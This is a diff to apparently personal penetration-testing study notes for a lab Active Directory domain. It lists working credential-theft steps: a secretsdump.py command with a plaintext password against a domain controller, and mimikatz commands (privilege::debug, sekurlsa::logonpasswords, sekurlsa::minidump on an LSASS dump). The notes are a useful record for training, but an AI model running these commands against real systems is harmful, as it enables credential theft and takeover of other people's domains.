@@ -22,11 +22,10 @@ secretsdumpy.py marvel.local/pparker:'Password123'@10.1.1.1 -just-dc-ntlm   //dc
 tool to steal creds, generate kerberos tickets, pass hash attacks, silver and golden ticket attacks  
 Use it where possible – Windows only -- very powerfull !!  covers more than secretsdump and cme  
 
-Download from github gentilkiwi  
-Download the latest mimikatz-trunk.zip  
-Extract them on kali  
-copy the 4 files into the windows target machine  or if you can downLoad it from github straight even better  
+/usr/share/windows-resources/mimikatz  //even 1 file .exe will do  
 Open cmd as administartor and execute the mimikatz.exe  
 
 Privilege::debug  //debug mode 
-Securlsa::logonpasswords   //dump creds  
+sekurlsa::logonpasswords   //dump creds  
+Instead of live dump, can also create a dump of Local Security Authority process from task manager and use it instead  
+sekurlsa::minidump C:\Users\lsass.DMP  
